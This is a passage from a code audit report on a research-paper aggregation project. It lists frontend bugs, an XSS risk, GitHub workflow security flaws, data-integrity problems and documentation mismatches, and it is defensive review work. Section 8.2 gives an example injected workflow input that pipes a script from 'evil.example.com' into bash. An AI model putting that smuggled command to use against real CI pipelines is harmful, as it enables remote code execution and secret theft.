### 7.1 `renderPaginator` inlines callback function references as strings — broken
**File:** `site/assets/js/app.js` — Lines 186–194  
```javascript
html += `<button ... onclick="(${onChange})(${current - 1})")>← Prev</button>`;
```
`onChange` is a JavaScript function passed as a parameter. `${onChange}` stringifies the function using `.toString()`, embedding the entire function body as inline `onclick` code. In strict mode or when the function references closure variables (like `papers`, `current`, `filters`), the stringified version will fail at runtime because the closure is out of scope. Pagination will likely throw `ReferenceError` when any paginator button is clicked.

---

### 7.2 Global search `loadSearchData` loads `authors.json` which is 24 MB
**File:** `site/assets/js/app.js` — Lines 229–238  
```javascript
const [papers, authors, topics] = await Promise.all([
    fetch('data/search_index.json').then(r => r.json()).catch(() => []),
    fetch('data/authors.json').then(r => r.json()).catch(() => []),   // 24 MB
    fetch('data/topics.json').then(r => r.json()).catch(() => []),    // 0.7 MB
]);
```
Loading 24 MB of author data just to support per-name search in the global search box will cause severe performance degradation (page freeze for 2–10 seconds) on mobile or slow connections. No pagination, lazy loading, or server-side search is implemented.

---

### 7.3 `renderDropdown` does not escape query string in `href` attributes
**File:** `site/assets/js/app.js` — Line 276  
```javascript
href="papers.html?q=${encodeURIComponent(p.title)}"
```
`encodeURIComponent` is used — correct. But on line 303:
```javascript
href="search.html?q=${encodeURIComponent(query)}"
```
Also correct. However, within `renderDropdown`, the `query` variable is used in the "no results" message:
```javascript
dropdown.innerHTML = `<p ...>No results for "<strong>${escHtml(query)}</strong>"</p>`;
```
`escHtml` is called here — correct. But query is also embedded into HTML in `html +=` blocks directly as `encodeURIComponent(p.title)` - inside a string-built `href`. If `p.title` contains single quotes or angle brackets *and* the HTML builder fails to use `escHtml` for every attribute, XSS is possible. Line 127: `<a href="${escHtml(url)}"` — correct. But line 276: `href="papers.html?q=${encodeURIComponent(p.title)}"` is NOT wrapped in `escHtml`, meaning if `p.title` contains `"` (double quote), the `href` attribute can be closed and arbitrary attributes injected.

---

### 7.4 `initSearch` uses `let debounce` as a timer ID, shadowing the module-level `debounce` utility
*Already covered in §1.2 — critical.*

---

### 7.5 Mobile menu `aria-expanded` is set to `String(isOpen)` — inverted logic
**File:** `site/assets/js/app.js` — Lines 463–469  
```javascript
const isOpen = !mobileMenu.classList.contains('hidden');
mobileMenu.classList.toggle('hidden');
...
mobileBtn.setAttribute('aria-expanded', String(isOpen));
```
`isOpen` is the state **before** the toggle. After `classList.toggle('hidden')`, if the menu was hidden (`isOpen = false`), it becomes visible — but `aria-expanded` is set to `"false"` (the pre-toggle value). The `aria-expanded` attribute is always inverted from the actual state.

---

### 7.6 No Content Security Policy headers on the static site
All HTML pages in `site/` include inline `onclick`, inline `style` attributes, and `<script>` tags. There are no CSP meta tags or headers defined. Combined with the potential XSS vector in §7.3, this means there is no defense-in-depth protection.

---

## 8. Security Issues

### 8.1 `urllib.request.urlopen` with no SSL certificate verification — `# noqa: S310`
**File:** `src/connectors/arxiv_connector.py` — Line 211  
The `# noqa: S310` comment suppresses the security linter warning for `urlopen`. While the URL is hardcoded to `export.arxiv.org`, any man-in-the-middle attack on the network path can inject arbitrary content that gets parsed and stored. All connectors that use `urlopen` without explicitly verifying SSL certificates share this risk.

---

### 8.2 `backfill.yml` injects user input directly into shell command without sanitization
**File:** `.github/workflows/backfill.yml` — Line 50  
```yaml
python src/pipeline.py --backfill-from ${{ github.event.inputs.from_date }} $SKIP_FLAG
```
`from_date` is a `workflow_dispatch` input. If an attacker with write access to the repo triggers the workflow with `from_date = "2026-01-01; curl http://evil.example.com | bash"`, the shell will execute the injected command. The input should be quoted: `"${{ github.event.inputs.from_date }}"`.

---

### 8.3 `SEMANTIC_SCHOLAR_KEY` API key logged to workflow output
**File:** `.github/workflows/pipeline.yml` — Lines 49–62  
The workflow echoes the full command being run including environment interpolation, but the API key is passed via `env:` not directly in the command. However, if the key is ever accidentally included in a flag (e.g., via a mis-configured input), it would be logged. More critically, the `PYTHONPATH` and other env vars are echoed — combined with debug logging enabled, secrets could leak.

---

## 9. Data Integrity Issues

### 9.1 `papers_db.json` is committed to the git repository — 46 MB in version control
Large binary-ish JSON data (46 MB, growing) is committed directly to the repository in `site/data/`. Every pipeline run generates a new commit adding/modifying this file by megabytes. This will make the git history grow rapidly, clone times slow, and GitHub storage limits could be hit. No `.gitattributes` LFS configuration is present.

---

### 9.2 `MAX_DB_PAPERS = 10,000` but `search_index.json` indexes ALL DB papers
**File:** `src/sitegen/generator.py` — Line 50  
```python
self._write(output_dir, "search_index.json", [self._search_entry(p) for p in db_papers])
```
`db_papers` is up to 10,000 papers. The search index is built from all DB papers, not just the frontend slice — the search index is therefore up to 4 MB (currently already 4 MB per `site/data/search_index.json`). Then it is loaded in full by the client-side JavaScript (§7.2).

---

### 9.3 `_load_existing_papers` falls back to `papers.json` but `papers.json` only has 1,000 papers
**File:** `src/pipeline.py` — Lines 133–138  
On the first run (no `papers_db.json`), the code falls back to `papers.json` which contains only the top 1,000 frontend papers. These 1,000 papers then become the "existing" accumulation seed. Any papers ranked 1,001–10,000 that existed in a previous `papers_db.json` (e.g., if the db file was deleted) are permanently lost.

---

### 9.4 Deduplication is stateless — re-running pipeline on same data produces different IDs
`GapExtractor._layer1_explicit` and `_layer3_starters` use `uuid.uuid4()` to generate `gap_id`. Every pipeline run generates new UUIDs for the same conceptual gaps, making it impossible to track a single gap across pipeline runs or link editorial items to the same gap over time.

---

## 10. Code Quality / Maintainability Issues

### 10.1 `_CURRENT_YEAR` is evaluated once at module import time
**File:** `src/scoring/scorer.py` — Line 24  
**File:** `src/aggregation/aggregator.py` — Line 20  
**File:** `src/clustering/clusterer.py` — Line 12  
If the pipeline runs near midnight on December 31 and the module was imported before January 1, all year comparisons will use the old year for the entire run. For a short-lived process this is acceptable but for long-running or cached instances it is incorrect.

---

### 10.2 `_merge` in `deduplicator.py` does not merge `tags`, `authors`, or `topics`
**File:** `src/dedup/deduplicator.py` — Lines 77–87  
`_merge` only transfers `abstract`, `pdf_url`, `affiliations_raw`, and `citations` from the loser to the winner. Tags, additional authors (a conference version may have complete author list while preprint doesn't), and citations from the loser are silently lost.

---

### 10.3 `_fetch_via_api` in `arxiv_connector.py` prepends `"all:"` to the query
**File:** `src/connectors/arxiv_connector.py` — Line 199  
```python
def _fetch_via_api(self, query: str, max_results: int) -> list[Paper]:
    return self._fetch_via_api_paginated(f"all:{query}", 0, max_results)
```
The `all:` prefix searches all arXiv fields. But `_fetch_via_package` (the primary method) uses the arxiv library with no `all:` prefix. The two code paths apply different search semantics, producing different results for the same query depending on whether the `arxiv` package is installed.

---

### 10.4 `researchscope/analysis/__init__.py` exports functions that are not tested in CI
**File:** `researchscope/analysis/__init__.py`  
The file exports `find_research_gaps` and `rank_papers` from the legacy analysis modules. `test_analysis.py` tests these but is ignored by CI (§5.1).

---

### 10.5 `Lab.university` field is declared as a `str` but never populated
**File:** `src/normalization/schema.py` — Line 194  
`Lab.university: str = ""` is never set in `Aggregator.build_labs()`. Joining labs to universities is not implemented despite both entity types existing.

---

### 10.6 Inline `json` re-import inside `_enrich_affiliations_from_s2`
**File:** `src/pipeline.py` — Lines 66–70  
```python
import json as _json
import os
import time
import urllib.request
```
All of these are re-imported inside a function that is nested inside a module that already imports `json` at line 24. Using `import json as _json` within a function body serves no purpose and is misleading.

---

### 10.7 `_ARXIV_URL_RE` does not match all common arXiv ID formats
**File:** `src/dedup/deduplicator.py` — Line 31  
`r"arxiv\.org/abs/(\d{4}\.\d{4,5})"` only matches new-format arXiv IDs (post-2007). Old-format IDs like `arxiv.org/abs/hep-th/0601001` (format: `category/YYMM###`) are not matched. Conference papers with such IDs (common in physics but also appear in CS) will never be deduplicated against their arXiv counterparts.

---

## 11. Configuration Issues

### 11.1 `.env.example` uses `SEMANTIC_SCHOLAR_API_KEY` but the code reads `SEMANTIC_SCHOLAR_KEY`
**File:** `.env.example` — Line 6: `SEMANTIC_SCHOLAR_API_KEY=your_key_here`  
**File:** `src/connectors/semantic_scholar_connector.py` — Line 61: `os.getenv("SEMANTIC_SCHOLAR_KEY", "")`  
**File:** `.github/workflows/pipeline.yml` — Line 45: `SEMANTIC_SCHOLAR_KEY: ${{ secrets.SEMANTIC_SCHOLAR_KEY }}`  

The environment variable name in `.env.example` does not match the name the code actually reads. A user who follows the `.env.example` and sets `SEMANTIC_SCHOLAR_API_KEY` will find the API key is never picked up, silently running at the unauthenticated rate limit with no error.

---

### 11.2 `config/topics.yaml` is loaded but has no documented or enforced schema
**File:** `config/topics.yaml`  
The file defines topic hierarchies, but since `_load_topics()` returns the dict and it is never used (§3.4), there is no runtime validation of the YAML structure. Invalid YAML or wrong key names are silently ignored.

---

## 12. Documentation Issues

### 12.1 `README.md` does not mention the existence of the deprecated legacy CLI
Users running `pip install .` get the `researchscope` entry point, but README only documents running `python src/pipeline.py`. The deprecated CLI and the production pipeline are never distinguished.

---

### 12.2 Pipeline stage count in docstring is wrong
**File:** `src/pipeline.py` — Lines 8–19  
The module docstring says "11 stages" and lists them. The code logs exactly: "Stage 1/11", "Stage 2/11", etc. This is consistent. However Stage 1b (S2 affiliation enrichment, line 339) is not counted as a stage in the docstring, making the documented count technically incomplete.

---

### 12.3 `CONTRIBUTING.md` instructs contributors to run `pytest` without specifying which dependencies are needed
**File:** `CONTRIBUTING.md`  
Contributors following the guide will run into import errors for `pydantic`, `tinydb`, and `httpx` unless they install the full pyproject dev deps, which are not in `requirements.txt`. The contributing guide does not distinguish between the two package sets.

---

### 12.4 `architecture.md` describes a system that includes LLM-powered enrichment, but no LLM integration exists
**File:** `architecture.md`  
The architecture document describes AI-powered content generation and LLM enrichment as current features. In the actual codebase, `ContentGenerator` uses string templates and regex — no LLM API calls exist anywhere. `OPENAI_API_KEY` and `ANTHROPIC_API_KEY` are wired into CI but never read by any production code.

---

*End of report. Total issues found: 60+, spanning critical runtime failures, silent logic errors, architectural debt, security vulnerabilities, and test coverage gaps.*
